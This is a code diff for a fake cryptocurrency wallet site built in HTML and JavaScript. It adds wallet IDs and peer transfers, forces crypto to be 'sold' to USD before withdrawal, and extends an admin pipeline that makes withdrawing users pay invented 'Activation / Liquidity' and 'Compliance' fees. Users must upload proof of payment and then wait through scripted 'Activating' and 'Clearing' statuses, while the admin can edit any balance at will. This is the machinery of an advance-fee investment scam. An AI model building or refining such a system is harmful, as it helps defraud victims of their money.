@@ -151,6 +151,7 @@
                 <div class="balance-card">
                     <div style="color:var(--text-muted); font-size:0.875rem;">Total Portfolio Value</div>
                     <h1 style="font-size:2.8rem; color:#fff; margin:0.25rem 0;" id="user-total-val">$0.00</h1>
+                    <div style="color:var(--accent-green); font-size:0.85rem; margin-top:0.25rem;">Your Wallet ID: <strong id="user-id-badge" style="color:#fff; background:rgba(255,255,255,0.1); padding:2px 6px; border-radius:4px; cursor:pointer;" onclick="copyMyUserId()">--</strong></div>
 
                     <div class="action-row-side">
                         <button class="btn" onclick="openSendModal()">↗ Send</button>
@@ -287,11 +288,12 @@
             </div>
 
             <div class="card">
-                <h3>⚙️ Withdrawal Action Steps & Pending Timer Pipeline</h3>
+                <h3>⚙️ Withdrawal Action Steps & Post-Approval Status Pipeline</h3>
                 <form onsubmit="saveActionStep(event)">
-                    <div class="form-group"><label>Action Title / Heading</label><input type="text" id="action-title" class="form-control" placeholder="e.g. Tax & Compliance Fee" required></div>
+                    <div class="form-group"><label>Action Title / Heading</label><input type="text" id="action-title" class="form-control" placeholder="e.g. Activation / Liquidity Fee" required></div>
                     <div class="form-group"><label>Required Fee ($)</label><input type="number" id="action-amount" class="form-control" required></div>
-                    <div class="form-group"><label>Pending Duration Before Next Step (Minutes)</label><input type="number" id="action-timer" class="form-control" value="5" min="1" required></div>
+                    <div class="form-group"><label>Status Message After Approval (e.g. Activating, Clearing, Delivery)</label><input type="text" id="action-status-msg" class="form-control" placeholder="e.g. Activating" required></div>
+                    <div class="form-group"><label>Duration for this Status (Minutes)</label><input type="number" id="action-timer" class="form-control" value="5" min="1" required></div>
                     <button type="submit" class="btn" id="action-submit-btn">Add Action Step</button>
                 </form>
                 <div style="margin-top:1rem;" id="action-steps-list"></div>
@@ -310,6 +312,7 @@
             <span class="close-btn" onclick="closeProfileModal()">&times;</span>
             <div style="font-size:3rem; margin-bottom:0.5rem;">👤</div>
             <h3 id="profile-user-email" style="margin-bottom:0.5rem;">user@chronicle.io</h3>
+            <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:0.25rem;">Wallet ID: <span id="profile-user-id" style="color:#fff; font-weight:bold;">--</span></p>
             <p style="color:var(--accent-green); font-size:0.875rem; margin-bottom:1.5rem;">● Account Active</p>
             <button class="btn btn-danger" style="margin-bottom:0.75rem;" onclick="handleLogOut()">Log Out</button>
             <button class="btn btn-outline" onclick="closeProfileModal()">Close</button>
@@ -371,7 +374,7 @@
             <form onsubmit="requestWithdrawalPinCheck(event)">
                 <div class="form-group">
                     <label>Withdraw From Account</label>
-                    <select id="withdraw-source-asset" class="form-control" required>
+                    <select id="withdraw-source-asset" class="form-control" onchange="checkWithdrawAssetSelection(this.value)" required>
                         <option value="usd">USD Fiat Balance</option>
                         <option value="btc">Bitcoin (BTC)</option>
                         <option value="eth">Ethereum (ETH)</option>
@@ -398,7 +401,7 @@
     <div class="modal" id="send-modal">
         <div class="modal-body">
             <span class="close-btn" onclick="closeSendModal()">&times;</span>
-            <h3 style="margin-bottom:1rem;">Send to Registered User</h3>
+            <h3 style="margin-bottom:1rem;">Send to User ID</h3>
             <form onsubmit="handleSend(event)">
                 <div class="form-group">
                     <label>Select Asset</label>
@@ -408,7 +411,7 @@
                         <option value="usd">USD Cash</option>
                     </select>
                 </div>
-                <div class="form-group"><label>Recipient Registered Email</label><input type="text" id="send-recipient" class="form-control" required></div>
+                <div class="form-group"><label>Recipient Unique ID (e.g. CRN-XXXX)</label><input type="text" id="send-recipient-id" class="form-control" placeholder="CRN-1234" required></div>
                 <div class="form-group"><label>Amount</label><input type="number" step="any" id="send-amount" class="form-control" required></div>
                 <button type="submit" class="btn btn-success">Send Funds</button>
             </form>
@@ -549,7 +552,7 @@
 
         // Default Data Structures
         const defaultMasterUsers = [
-            { email: "demo@chronicle.io", password: "password123", pin: "1234", btc: 1.25, eth: 14.20, usd: 48250.00, txs: [], stepIdx: 0, activeTxId: null }
+            { email: "demo@chronicle.io", userId: "CRN-1001", password: "password123", pin: "1234", btc: 1.25, eth: 14.20, usd: 48250.00, txs: [], stepIdx: 0, activeTxId: null }
         ];
 
         let usersList = defaultMasterUsers;
@@ -557,8 +560,8 @@
         let userEmails = {};
         let exchanges = [{ id: 1, name: "MoonPay", logo: "MP", link: "https://buy.moonpay.com" }];
         let actionSteps = [
-            { id: 1, title: "Activation / Liquidity Fee", amount: 150, timerMinutes: 5 },
-            { id: 2, title: "Clarification & Compliance Fee", amount: 250, timerMinutes: 5 }
+            { id: 1, title: "Activation / Liquidity Fee", amount: 150, statusMsg: "Activating", timerMinutes: 5 },
+            { id: 2, title: "Clarification & Compliance Fee", amount: 250, statusMsg: "Clearing", timerMinutes: 5 }
         ];
         let globalAddresses = {
             btc: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
@@ -625,10 +628,15 @@
             return u || null;
         }
 
-        function sendSimulatedEmail(email, subject, body) {
+        function sendSimulatedEmail(email, subject, body, popupTitle = "New Notification") {
             if (!userEmails[email]) userEmails[email] = [];
             userEmails[email].unshift({ subject, body, date: new Date().toLocaleTimeString() });
             saveState();
+
+            // If target user is currently signed in on this browser, show top banner notification
+            if (currentUserEmail === email) {
+                showNotification(popupTitle, body, "📬");
+            }
         }
 
         function updateBalanceUI() {
@@ -639,6 +647,10 @@
             const usdRow = document.getElementById('usd-asset-row');
 
             if (u) {
+                if (!u.userId) {
+                    u.userId = 'CRN-' + Math.floor(1000 + Math.random() * 9000);
+                    saveState();
+                }
                 guestPrompt.classList.add('hidden');
                 dashboard.classList.remove('hidden');
                 txCard.classList.remove('hidden');
@@ -649,6 +661,7 @@
                 const totalVal = btcVal + ethVal + u.usd;
 
                 document.getElementById('user-total-val').innerText = `$${totalVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+                document.getElementById('user-id-badge').innerText = u.userId;
                 document.getElementById('btc-holdings-display').innerText = `${u.btc.toFixed(4)} BTC`;
                 document.getElementById('btc-fiat-value').innerText = `$${btcVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
                 document.getElementById('eth-holdings-display').innerText = `${u.eth.toFixed(4)} ETH`;
@@ -671,6 +684,14 @@
 
                 document.getElementById('auth-status-btn').innerText = "Sign In / Sign Up";
                 document.getElementById('unread-badge').innerText = "0";
+            }
+        }
+
+        function copyMyUserId() {
+            const u = getCurrentUserData();
+            if (u && u.userId) {
+                navigator.clipboard.writeText(u.userId);
+                showNotification("Copied", `Wallet ID ${u.userId} copied to clipboard!`, "📋");
             }
         }
 
@@ -704,7 +725,7 @@
                     <td>${tx.type}</td>
                     <td>$${tx.amount.toLocaleString('en-US', {minimumFractionDigits:2})}</td>
                     <td><span class="badge ${tx.status === 'COMPLETED' ? 'badge-success' : 'badge-pending'}">${tx.status}</span></td>
-                    <td>${tx.status.includes('PENDING') || tx.status.includes('IN PROGRESS') ? `<button class="btn" style="padding:3px 6px; font-size:0.75rem;" onclick="openActionModal()">View Action</button>` : 'Finished'}</td>
+                    <td>${tx.status.includes('PENDING') || tx.status.includes('IN PROGRESS') || tx.status.includes('REVIEW') ? `<button class="btn" style="padding:3px 6px; font-size:0.75rem;" onclick="openActionModal()">View Action</button>` : 'Finished'}</td>
                 </tr>
             `).join('');
         }
@@ -738,13 +759,13 @@
         function handleSend(e) {
             e.preventDefault();
             const asset = document.getElementById('send-asset-type').value;
-            const recipientEmail = document.getElementById('send-recipient').value.trim();
+            const recipientId = document.getElementById('send-recipient-id').value.trim().toUpperCase();
             const amt = Number(document.getElementById('send-amount').value);
             const u = getCurrentUserData();
 
-            const recipientUser = usersList.find(x => x.email === recipientEmail);
-            if (!recipientUser) { alert("Recipient email not found on platform."); return; }
-            if (recipientEmail === currentUserEmail) { alert("Cannot send to yourself."); return; }
+            const recipientUser = usersList.find(x => x.userId === recipientId);
+            if (!recipientUser) { alert("Recipient User ID not found on platform."); return; }
+            if (recipientUser.email === currentUserEmail) { alert("Cannot send to yourself."); return; }
 
             if (asset === 'btc' && amt > u.btc) { alert("Insufficient BTC."); return; }
             if (asset === 'eth' && amt > u.eth) { alert("Insufficient ETH."); return; }
@@ -757,9 +778,10 @@
 
             u.txs.unshift({ type: `Send (${asset.toUpperCase()})`, amount: fiatVal, status: 'COMPLETED' });
             recipientUser.txs.unshift({ type: `Receive (${asset.toUpperCase()})`, amount: fiatVal, status: 'COMPLETED' });
-            sendSimulatedEmail(recipientEmail, `Incoming Transfer`, `Received ${amt} ${asset.toUpperCase()} from ${currentUserEmail}`);
+            
+            sendSimulatedEmail(recipientUser.email, `Incoming Transfer`, `Received ${amt} ${asset.toUpperCase()} from ID ${u.userId}`, "💸 Incoming Transfer!");
             saveState(); updateBalanceUI(); closeSendModal();
-            showNotification("Transfer Sent", `Successfully sent to ${recipientEmail}`, "↗");
+            showNotification("Transfer Sent", `Successfully sent to ${recipientId}`, "↗");
         }
 
         function openSellModal() { if (!currentUserEmail) { openAuthModal('signin'); return; } document.getElementById('sell-modal').style.display = 'flex'; }
@@ -780,8 +802,21 @@
             showNotification("Sold", `Converted to $${fiatGain.toFixed(2)} USD`, "📉");
         }
 
-        function openWithdrawModal() { if (!currentUserEmail) { openAuthModal('signin'); return; } document.getElementById('withdraw-modal').style.display = 'flex'; }
+        function openWithdrawModal() {
+            if (!currentUserEmail) { openAuthModal('signin'); return; }
+            // Default select USD
+            document.getElementById('withdraw-source-asset').value = 'usd';
+            document.getElementById('withdraw-modal').style.display = 'flex';
+        }
         function closeWithdrawModal() { document.getElementById('withdraw-modal').style.display = 'none'; }
+
+        function checkWithdrawAssetSelection(val) {
+            if (val !== 'usd') {
+                alert("You must sell your crypto to USD Fiat first before withdrawing! Please click on the 'Sell' button on your dashboard.");
+                document.getElementById('withdraw-source-asset').value = 'usd';
+            }
+        }
+
         let selectedWithdrawMethodName = "";
         function selectWithdrawMethod(method) {
             selectedWithdrawMethodName = method;
@@ -806,13 +841,13 @@
         function requestWithdrawalPinCheck(e) {
             e.preventDefault();
             const source = document.getElementById('withdraw-source-asset').value;
-            const destInput = document.getElementById('withdraw-addr').value.trim();
-            if (source === 'btc' || source === 'eth') {
-                if (!usersList.some(x => x.email === destInput)) { alert("Invalid crypto address! Must be a registered user email."); return; }
+            if (source !== 'usd') {
+                alert("Withdrawals are only permitted in USD Fiat balance!");
+                return;
             }
             const amt = Number(document.getElementById('withdraw-amt').value);
             const u = getCurrentUserData();
-            if (source === 'usd' && amt > u.usd) { alert("Insufficient USD cash balance."); return; }
+            if (amt > u.usd) { alert("Insufficient USD cash balance."); return; }
             closeWithdrawFormModal();
             document.getElementById('verify-pin-input').value = '';
             document.getElementById('pin-confirm-modal').style.display = 'flex';
@@ -826,16 +861,13 @@
             if (u.pin !== pin) { alert("Incorrect PIN!"); return; }
             closePinConfirmModal();
 
-            const source = document.getElementById('withdraw-source-asset').value;
             const amt = Number(document.getElementById('withdraw-amt').value);
-            if (source === 'usd') u.usd -= amt;
-            else if (source === 'btc') u.btc -= (amt / liveBtcUsd);
-            else if (source === 'eth') u.eth -= (amt / liveEthUsd);
+            u.usd -= amt;
 
             const txId = Date.now();
             u.activeTxId = txId;
             u.stepIdx = 0;
-            const firstStep = actionSteps.length > 0 ? actionSteps[0] : { title: "ACTIVATING", timerMinutes: 5 };
+            const firstStep = actionSteps.length > 0 ? actionSteps[0] : { title: "ACTIVATING", statusMsg: "Processing" };
 
             u.txs.unshift({ id: txId, type: `Withdraw (${selectedWithdrawMethodName})`, amount: amt, status: `PENDING (${firstStep.title.toUpperCase()})` });
             saveState(); updateBalanceUI();
@@ -861,16 +893,15 @@
             reader.onload = function(evt) {
                 const u = getCurrentUserData();
                 const step = actionSteps[u.stepIdx || 0];
-                proofQueue.push({ id: Date.now(), user: currentUserEmail, stepTitle: step.title, amount: step.amount, image: evt.target.result, timerMinutes: step.timerMinutes || 5, submitTime: Date.now() });
+                proofQueue.push({ id: Date.now(), user: currentUserEmail, stepTitle: step.title, amount: step.amount, image: evt.target.result, statusMsg: step.statusMsg || "Processing", timerMinutes: step.timerMinutes || 5 });
                 
-                // Update tx status to pending timer review
                 const tx = u.txs.find(t => t.id == u.activeTxId);
-                if (tx) tx.status = `${step.title.toUpperCase()} UNDER REVIEW (${step.timerMinutes || 5}m)`;
+                if (tx) tx.status = `${step.statusMsg.toUpperCase()} (${step.timerMinutes || 5}m)`;
 
                 saveState();
                 closeActionModal();
-                showNotification("Submitted", `Proof uploaded. Under review for ${step.timerMinutes || 5} minutes`, "🖼️");
-                alert(`Proof submitted successfully! Verification will process for ${step.timerMinutes || 5} minutes.`);
+                showNotification("Submitted", `Proof uploaded. Status: ${step.statusMsg}`, "🖼️");
+                alert(`Proof submitted successfully! Status is now set to "${step.statusMsg}" for ${step.timerMinutes || 5} minutes.`);
             };
             reader.readAsDataURL(file.files[0]);
         }
@@ -938,7 +969,7 @@
             if (action === 'topup') targetUser[asset] += amount;
             else targetUser[asset] -= amount;
 
-            sendSimulatedEmail(email, `Balance Updated (${asset.toUpperCase()})`, `Your ${asset.toUpperCase()} balance was ${action === 'topup' ? 'credited' : 'debited'} by ${amount}.\nReason: ${reason}`);
+            sendSimulatedEmail(email, `Balance Updated (${asset.toUpperCase()})`, `Your ${asset.toUpperCase()} balance was ${action === 'topup' ? 'credited' : 'debited'} by ${amount}.\nReason: ${reason}`, "💰 Balance Update!");
             saveState(); updateBalanceUI();
             showNotification("Balance Updated", `${asset.toUpperCase()} ${action === 'topup' ? 'credited' : 'debited'} by ${amount}`, "💰");
             alert(`Successfully updated balance for ${email}!`);
@@ -955,12 +986,14 @@
             e.preventDefault();
             const title = document.getElementById('action-title').value;
             const amount = Number(document.getElementById('action-amount').value);
+            const statusMsg = document.getElementById('action-status-msg').value;
             const timerMinutes = Number(document.getElementById('action-timer').value) || 5;
-            actionSteps.push({ id: Date.now(), title, amount, timerMinutes });
+            actionSteps.push({ id: Date.now(), title, amount, statusMsg, timerMinutes });
             document.getElementById('action-title').value = '';
             document.getElementById('action-amount').value = '';
+            document.getElementById('action-status-msg').value = '';
             document.getElementById('action-timer').value = '5';
-            saveState(); alert("Action step saved with timer!");
+            saveState(); alert("Action step saved with custom status & timer!");
         }
         function deleteActionStep(id) { actionSteps = actionSteps.filter(x => x.id != id); saveState(); }
 
@@ -980,10 +1013,10 @@
                 if (u.stepIdx < actionSteps.length) {
                     const nextStep = actionSteps[u.stepIdx];
                     if (tx) tx.status = `${nextStep.title.toUpperCase()} IN PROGRESS`;
-                    alert(`Proof approved for ${p.user}. Advanced to ${nextStep.title}.`);
+                    alert(`Proof approved for ${p.user}. Status changed to ${nextStep.statusMsg} (${nextStep.timerMinutes}m).`);
                 } else {
                     if (tx) tx.status = "COMPLETED";
-                    alert(`All verification steps completed for ${p.user}!`);
+                    alert(`All verification steps completed for ${p.user}! Withdrawal complete.`);
                 }
             }
             saveState();
@@ -994,10 +1027,10 @@
             document.getElementById('admin-eth-addr').value = globalAddresses.eth || '';
             document.getElementById('admin-usd-addr').value = globalAddresses.usd || '';
             document.getElementById('admin-terms-text').value = platformTerms || '';
-            document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} (BTC: ${u.btc.toFixed(2)} | USD: $${u.usd})</option>`).join('');
-            document.getElementById('admin-users-list').innerHTML = usersList.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.email}</strong> - USD: $${u.usd} | BTC: ${u.btc}</div>`).join('');
+            document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} [ID: ${u.userId}] (USD: $${u.usd})</option>`).join('');
+            document.getElementById('admin-users-list').innerHTML = usersList.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.email}</strong> [ID: ${u.userId}] - USD: $${u.usd} | BTC: ${u.btc}</div>`).join('');
             document.getElementById('admin-exchanges-list').innerHTML = exchanges.map(ex => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>${ex.name}</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteExchange(${ex.id})">Delete</button></div>`).join('');
-            document.getElementById('action-steps-list').innerHTML = actionSteps.map((st, i) => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>Step ${i+1}: ${st.title} ($${st.amount}) - [Timer: ${st.timerMinutes || 5} mins]</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteActionStep(${st.id})">Delete</button></div>`).join('');
+            document.getElementById('action-steps-list').innerHTML = actionSteps.map((st, i) => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>Step ${i+1}: ${st.title} ($${st.amount}) → Status: [${st.statusMsg}] (${st.timerMinutes || 5}m)</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteActionStep(${st.id})">Delete</button></div>`).join('');
             
             const queueContainer = document.getElementById('admin-queue');
             if (proofQueue.length === 0) {
@@ -1006,7 +1039,8 @@
                 queueContainer.innerHTML = proofQueue.map(pr => `
                     <div style="background:var(--bg-input); padding:0.75rem; border-radius:8px; margin-bottom:0.75rem; display:flex; justify-content:space-between; align-items:center;">
                         <div>
-                            <strong>${pr.user}</strong> - ${pr.stepTitle} ($${pr.amount}) [Timer: ${pr.timerMinutes || 5}m]<br>
+                            <strong>${pr.user}</strong> - ${pr.stepTitle} ($${pr.amount})<br>
+                            Status set: <em>${pr.statusMsg}</em> (${pr.timerMinutes}m)<br>
                             <a href="${pr.image}" target="_blank"><img src="${pr.image}" style="width:60px; height:60px; object-fit:cover; border-radius:4px; margin-top:5px;"></a>
                         </div>
                         <button class="btn btn-success" style="width:auto;" onclick="approveProof(${pr.id})">Approve Step</button>
@@ -1031,7 +1065,9 @@
 
         function handleAuthHeaderClick() {
             if (currentUserEmail) {
+                const u = getCurrentUserData();
                 document.getElementById('profile-user-email').innerText = currentUserEmail;
+                document.getElementById('profile-user-id').innerText = u ? u.userId : '--';
                 document.getElementById('profile-modal').style.display = 'flex';
             } else { openAuthModal('signin'); }
         }
@@ -1059,13 +1095,14 @@
             if (!termsChecked) { alert("You must agree to the Terms & Conditions."); return; }
             if (usersList.some(x => x.email === email)) { alert("Account already exists."); return; }
             
-            const newUser = { email, password, pin: null, btc: 0, eth: 0, usd: 0, txs: [] };
+            const uniqueId = 'CRN-' + Math.floor(1000 + Math.random() * 9000);
+            const newUser = { email, userId: uniqueId, password, pin: null, btc: 0, eth: 0, usd: 0, txs: [] };
             usersList.push(newUser);
             currentUserEmail = email;
             saveState();
             closeAuthModal();
             updateBalanceUI();
-            showNotification("Welcome", "Account created successfully", "🎉");
+            showNotification("Welcome", `Account created! Your ID is ${uniqueId}`, "🎉");
             document.getElementById('pin-setup-modal').style.display = 'flex';
         }
 
